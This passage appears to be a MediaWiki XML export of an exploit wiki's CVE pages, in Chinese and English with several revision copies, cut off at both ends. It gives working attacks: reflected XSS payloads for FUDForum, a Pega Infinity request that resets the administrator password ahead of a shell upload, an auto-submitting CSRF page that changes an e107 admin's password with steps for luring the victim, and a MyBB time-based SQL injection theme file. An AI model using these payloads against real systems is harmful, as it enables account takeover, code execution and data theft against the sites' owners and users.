User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Connection: close
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate
```





![Alt text](/hostHeaderInjection.jpg?raw=true "Optional Title")
 

&lt;/pre&gt;</text>
      <sha1>komw6fi1fh6n6q0h24g01cla04dedk4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27519 FUDForum 3.1.0 - 'srch' XSS漏洞</title>
    <ns>0</ns>
    <id>3363</id>
    <revision>
      <id>3927</id>
      <timestamp>2021-06-03T12:04:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; # Exploit Title: FUDForum 3.1.0 - 'srch' Reflected XSS # Exploit Author: Piyush Patil # Vendor Homepage: http://fudforum.org/ # Software Link: https://sourceforg..."</comment>
      <origin>3927</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="696" sha1="asfhxagmmeg5sbrk7i02eeat0buvkc3" xml:space="preserve">==XSS==
&lt;pre&gt;
# Exploit Title: FUDForum 3.1.0 - 'srch' Reflected XSS
# Exploit Author: Piyush Patil
# Vendor Homepage: http://fudforum.org/
# Software Link: https://sourceforge.net/projects/fudforum/files/FUDforum_3.1.0.zip/download
# Version: FUDForum 3.1.0
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-27519

-Description:
A cross-site scripting (XSS) issue in FUDForum 3.1.0 allows remote attackers to inject JavaScript via index.php in the "srch" parameter.


-Payload used:
x" onmouseover=alert(1) x="

-Steps to reproduce:
1- goto https://localhost/fudforum/index.php?t=search&amp;
2- In "forum search" option, paste XSS payload
3- Hover your mouse to "x" and XSS will get triggered
&lt;/pre&gt;</text>
      <sha1>asfhxagmmeg5sbrk7i02eeat0buvkc3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27520 FUDForum 3.1.0 - 'author' Reflected XSS漏洞</title>
    <ns>0</ns>
    <id>3364</id>
    <revision>
      <id>3928</id>
      <timestamp>2021-06-03T12:05:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: FUDForum 3.1.0 - 'author' Reflected XSS # Exploit Author: Piyush Patil # Vendor Homepage: http://fudforum.org/ # Software Link: https://sourceforge.net/..."</comment>
      <origin>3928</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="705" sha1="pkcjslwt2h49d9mavcg93x67bcilssm" xml:space="preserve">&lt;pre&gt;
# Exploit Title: FUDForum 3.1.0 - 'author' Reflected XSS
# Exploit Author: Piyush Patil
# Vendor Homepage: http://fudforum.org/
# Software Link: https://sourceforge.net/projects/fudforum/files/FUDforum_3.1.0.zip/download
# Version: FUDForum 3.1.0
# Tested on: Windows 10 and Kali
# CVE : CVE-2021-27520

-Description:
A cross-site scripting (XSS) issue in FUDForum 3.1.0 allows remote attackers to inject JavaScript via index.php in the "author" parameter.


-Payload used:
y" onmouseover=alert(2) y="

-Steps to reproduce:
1- goto https://localhost/fudforum/index.php?t=search&amp;
2- In the "Filter by User" search option, paste XSS payload
3- Hover your mouse to "y" and XSS will get triggered
&lt;/pre&gt;</text>
      <sha1>pkcjslwt2h49d9mavcg93x67bcilssm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27651 PEGA pega infinity 授權認證繞過RCE漏洞</title>
    <ns>0</ns>
    <id>2535</id>
    <revision>
      <id>3032</id>
      <timestamp>2021-05-22T02:16:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Pega Infinity &gt; = 8.2.1 Pega Infinity &lt;= 8.5.2 &lt;/pre&gt;  ==漏洞利用== 1.訪問任何實例登錄頁面，使用"administrator@pega.com"進行重置密..."</comment>
      <origin>3032</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1457" sha1="m3p6ygv0ghypsr9dffeew9m2k0j6tkz" xml:space="preserve">==影響版本==
&lt;pre&gt;
Pega Infinity &gt; = 8.2.1
Pega Infinity &lt;= 8.5.2
&lt;/pre&gt;

==漏洞利用==
1.訪問任何實例登錄頁面，使用"administrator@pega.com"進行重置密碼進行登錄,PoC如下，重置密碼為：Rules@1234進行登錄後上傳shell進行rce。
&lt;pre&gt;
POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://redacted.com
DNT: 1
Connection: close
Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
Cookie: yourCookie
Upgrade-Insecure-Requests: 1

pzAuth=guest&amp;NewPassword=Rules%401234&amp;ConfPassword=Rules%401234&amp;pyActivity%3DCode-Security.pzChangeUserPassword=

&lt;/pre&gt;

Nuclei Template：
&lt;pre&gt;
id: pega

info:
  name: Pega Infinity Login
  author: sshell
  severity: low

requests:
  - method: GET
    path:
      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    matchers:
      - type: word
        words:
          - "Pega API"


&lt;/pre&gt;</text>
      <sha1>m3p6ygv0ghypsr9dffeew9m2k0j6tkz</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27850 Apache Tapestry遠程執行代碼漏洞</title>
    <ns>0</ns>
    <id>5234</id>
    <revision>
      <id>5991</id>
      <timestamp>2021-06-27T08:23:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Apache Tapestry 5.4.5、5.5.0、5.6.2 and 5.7.0 &lt;/pre&gt;  ==POC== https://github.com/kahla-sec/CVE-2021-27850_POC"</comment>
      <origin>5991</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="173" sha1="291bp3ayfhaxzjp6bporpifng6tpt2a" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Apache Tapestry 5.4.5、5.5.0、5.6.2 and 5.7.0
&lt;/pre&gt;

==POC==
https://github.com/kahla-sec/CVE-2021-27850_POC</text>
      <sha1>291bp3ayfhaxzjp6bporpifng6tpt2a</sha1>
    </revision>
    <revision>
      <id>5992</id>
      <parentid>5991</parentid>
      <timestamp>2021-06-27T08:24:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5992</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="184" sha1="hv5dnnylp9hr548xbf2gyfyov7o675y" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Apache Tapestry 5.4.5、5.5.0、5.6.2 and 5.7.0
&lt;/pre&gt;

==POC==
https://github.com/kahla-sec/CVE-2021-27850_POC</text>
      <sha1>hv5dnnylp9hr548xbf2gyfyov7o675y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27850 Apache Tapestry遠程執行代碼漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5240</id>
    <revision>
      <id>5998</id>
      <timestamp>2021-06-27T08:28:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>5998</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="148" sha1="838lpmu6knv4ezyw0xq6qas270wa7cq" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Apache Tapestry 5.4.5、5.5.0、5.6.2 and 5.7.0
&lt;/pre&gt;

==POC==
https://github.com/kahla-sec/CVE-2021-27850_POC</text>
      <sha1>838lpmu6knv4ezyw0xq6qas270wa7cq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27885 e107 CMS 2.3.0 跨站請求偽造漏洞</title>
    <ns>0</ns>
    <id>3122</id>
    <revision>
      <id>3625</id>
      <timestamp>2021-05-30T02:41:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: e107 CMS 2.3.0 - CSRF # Date: 04/03/2021 # Exploit Author: Tadjmen # Vendor Homepage: https://e107.org # Software Link: https://e107.org/downloa..."</comment>
      <origin>3625</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1717" sha1="ol103ueja2qsmhv8aba7xalfqfc23as" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: e107 CMS 2.3.0 - CSRF
# Date: 04/03/2021
# Exploit Author: Tadjmen
# Vendor Homepage: https://e107.org
# Software Link: https://e107.org/download
# Version: 2.3.0
# Tested on: Windows 10
# CVE : CVE-2021-27885

CSRF vulnerability on e107 CMS

## Bug Description
Hi. I found a CSRF on the e107 CMS. Hacker can change password any user click the link.

## How to Reproduce
Steps to reproduce the behavior:
1. Create a CSRF login POC using the following code.

```
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;

&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Cross Site Request Forgery (Edit Existing Admin details)&lt;/title&gt;
&lt;/head&gt;

&lt;body onload="javascript:fireForms()"&gt;
&lt;script language="JavaScript"&gt;

function fireForms()
{
    var count = 2;
    var i=0;

    for(i=0; i&lt;count; i++)
    {
        document.forms[i].submit();
    }
}

&lt;/script&gt;

&lt;H2&gt;Cross Site Request Forgery (Edit Existing Admin details)&lt;/H2&gt;

&lt;form method="POST" name="form0" action="
http://localhost/[path-to-e107-cms]/usersettings.php"&gt;

&lt;input type="hidden" name="loginname" value="admin"/&gt;
&lt;input type="hidden" name="email" value="[email]"/&gt;
&lt;input type="hidden" name="password1" value="[password]"/&gt;
&lt;input type="hidden" name="password2" value="[password]"/&gt;
&lt;input type="hidden" name="hideemail" value="1"/&gt;
&lt;input type="hidden" name="image" value=""/&gt;
&lt;input type="hidden" name="signature" value=""/&gt;
&lt;input type="hidden" name="updatesettings" value="Save settings"/&gt;
&lt;input type="hidden" name="_uid" value="2"/&gt;




&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;
```


2. Replace the email and password with the valid credentials.
3. Send the link script to the victim (admin) to make them click.
4. Login with new admin password

&lt;/pre&gt;</text>
      <sha1>ol103ueja2qsmhv8aba7xalfqfc23as</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27890 MyBB後台論壇主題管理SQL注入漏洞</title>
    <ns>0</ns>
    <id>355</id>
    <revision>
      <id>530</id>
      <timestamp>2021-03-21T02:37:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt;  &lt;pre&gt; &lt; 1.8.26 &lt;/pre&gt;   &lt;translate&gt; ==漏洞利用== &lt;/translate&gt;  &lt;translate&gt; 在後台主題管理處導入構造..."</comment>
      <origin>530</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1001" sha1="lgs774cdvqqliwq8y9ci0pp39c2w440" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
在後台主題管理處導入構造的惡意xml
&lt;/translate&gt;

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

&lt;translate&gt;
點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）
&lt;/translate&gt;</text>
      <sha1>lgs774cdvqqliwq8y9ci0pp39c2w440</sha1>
    </revision>
    <revision>
      <id>531</id>
      <parentid>530</parentid>
      <timestamp>2021-03-21T02:37:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>531</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1045" sha1="osoghotbswnhpyvky0xkmifdm5ns3ir" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
在後台主題管理處導入構造的惡意xml
&lt;/translate&gt;

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）
&lt;/translate&gt;</text>
      <sha1>osoghotbswnhpyvky0xkmifdm5ns3ir</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27890 MyBB後台論壇主題管理SQL注入漏洞/en</title>
    <ns>0</ns>
    <id>3244</id>
    <revision>
      <id>3784</id>
      <timestamp>2021-05-31T06:15:00Z</timestamp>
      <contributor>
        <username>L0snight</username>
        <id>78</id>
      </contributor>
      <comment>Created page with "==Affected Versions=="</comment>
      <origin>3784</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="979" sha1="btu83s2m03enh6an2jxi9p1773cugb6" xml:space="preserve">&lt;languages  /&gt;
==Affected Versions==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


==Exploit==

Import the constructed malicious xml in the backend theme manager

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）
&lt;/div&gt;</text>
      <sha1>btu83s2m03enh6an2jxi9p1773cugb6</sha1>
    </revision>
    <revision>
      <id>3786</id>
      <parentid>3784</parentid>
      <timestamp>2021-05-31T06:18:35Z</timestamp>
      <contributor>
        <username>L0snight</username>
        <id>78</id>
      </contributor>
      <comment>Created page with "Click "Duplicate Theme", then capture the traffic, successfully implemented delayed injection (the injection will also exist in the export function)"</comment>
      <origin>3786</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="978" sha1="80ucj1ezteuvue0j6tdiwt1zvqlll6n" xml:space="preserve">&lt;languages  /&gt;
==Affected Versions==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


==Exploit==

Import the constructed malicious xml in the backend theme manager

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

Click "Duplicate Theme", then capture the traffic, successfully implemented delayed injection (the injection will also exist in the export function)</text>
      <sha1>80ucj1ezteuvue0j6tdiwt1zvqlll6n</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27890 MyBB後台論壇主題管理SQL注入漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3236</id>
    <revision>
      <id>3774</id>
      <timestamp>2021-05-31T06:03:52Z</timestamp>
      <contributor>
        <username>L0snight</username>
        <id>78</id>
      </contributor>
      <comment>Created page with "CVE-2021-27890 MyBB后台论坛主题管理SQL注入漏洞"</comment>
      <origin>3774</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1145" sha1="qq8yi2fb2o8jtwo1w5bc1ly51g5j9h4" xml:space="preserve">&lt;languages  /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響版本==
&lt;/div&gt;

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞利用==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
在後台主題管理處導入構造的惡意xml
&lt;/div&gt;

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）
&lt;/div&gt;</text>
      <sha1>qq8yi2fb2o8jtwo1w5bc1ly51g5j9h4</sha1>
    </revision>
    <revision>
      <id>3777</id>
      <parentid>3774</parentid>
      <timestamp>2021-05-31T06:04:21Z</timestamp>
      <contributor>
        <username>L0snight</username>
        <id>78</id>
      </contributor>
      <comment>Created page with "在后台主题管理处导入构造的恶意xml"</comment>
      <origin>3777</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="962" sha1="bsa77nthoh7vcmckjfr5m4ngxw3jcvz" xml:space="preserve">&lt;languages  /&gt;
==影响版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


==漏洞利用==

在后台主题管理处导入构造的恶意xml

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）
&lt;/div&gt;</text>
      <sha1>bsa77nthoh7vcmckjfr5m4ngxw3jcvz</sha1>
    </revision>
    <revision>
      <id>3779</id>
      <parentid>3777</parentid>
      <timestamp>2021-05-31T06:05:12Z</timestamp>
      <contributor>
        <username>L0snight</username>
        <id>78</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>3779</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="903" sha1="i5h4a4fx7saw6up0gjlf8sct1ij373k" xml:space="preserve">&lt;languages  /&gt;
==影响版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


==漏洞利用==

在后台主题管理处导入构造的恶意xml

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

点击Duplicate Theme，抓包，成功延时注入（导出主题也会存在该注入）</text>
      <sha1>i5h4a4fx7saw6up0gjlf8sct1ij373k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27890 MyBB後台論壇主題管理SQL注入漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5081</id>
    <revision>
      <id>5821</id>
      <timestamp>2021-06-24T02:15:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "在後台主題管理處導入構造的惡意xml"</comment>
      <origin>5821</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="901" sha1="k6nc6h7xyb7zh5wz69mdwgc8fu9o4x2" xml:space="preserve">&lt;languages  /&gt;
==影響版本==

&lt;pre&gt;
&lt; 1.8.26
&lt;/pre&gt;


==漏洞利用==

在後台主題管理處導入構造的惡意xml

&lt;pre&gt;
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;theme name="1' and sleep(10) and '" version="1825"&gt;
&lt;properties&gt;
&lt;templateset&gt;-2' or sleep(0.01) or '&lt;/templateset&gt;
&lt;editortheme&gt;&lt;![CDATA[mybb.css]]&gt;&lt;/editortheme&gt;
&lt;imgdir&gt;&lt;![CDATA[images]]&gt;&lt;/imgdir&gt;
&lt;logo&gt;&lt;![CDATA[images/logo.png]]&gt;&lt;/logo&gt;
&lt;tablespace&gt;&lt;![CDATA[5]]&gt;&lt;/tablespace&gt;
&lt;borderwidth&gt;&lt;![CDATA[0]]&gt;&lt;/borderwidth&gt;
&lt;color&gt;&lt;![CDATA[]]&gt;&lt;/color&gt;
&lt;disporder&gt;&lt;![CDATA[a:7:{s:10:"global.css";i:1;s:10:"usercp.css";i:2;s:9:"modcp.css";i:3;s:16:"star_ratings.css";i:4;s:14:"showthread.css";i:5;s:17:"thread_status.css";i:6;s:8:"css3.css";i:7;}]]&gt;&lt;/disporder&gt;
&lt;/properties&gt;
&lt;stylesheets&gt;
&lt;/stylesheets&gt;
&lt;templates&gt;
&lt;/templates&gt;
&lt;/theme&gt;
&lt;/pre&gt;

點擊Duplicate Theme,抓包，成功延时注入（導出主題也會存在該注入）</text>
      <sha1>k6nc6h7xyb7zh5wz69mdwgc8fu9o4x2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-27905 Apache Solr Replication handler SSRF漏洞</title>
    <ns>0</ns>
    <id>2551</id>
    <revision>
      <id>3049</id>
      <timestamp>2021-05-22T02:46:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== &lt;pre&gt; Apache Solr 7.0.0 - 7.7.3 Apache Solr 8.0.0 - 8.8.1 &lt;/pre&gt;  ==POC== &lt;pre&gt; GET /solr/test/replication?command=fetchindex&amp;masterUrl=http://127.0.0.1/&amp;wt=j..."</comment>
      <origin>3049</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="380" sha1="o83nw7mstk52xvpfqc1gr93q8uqhsax" xml:space="preserve">==影響版本==
&lt;pre&gt;
Apache Solr 7.0.0 - 7.7.3 Apache Solr 8.0.0 - 8.8.1
&lt;/pre&gt;

==POC==
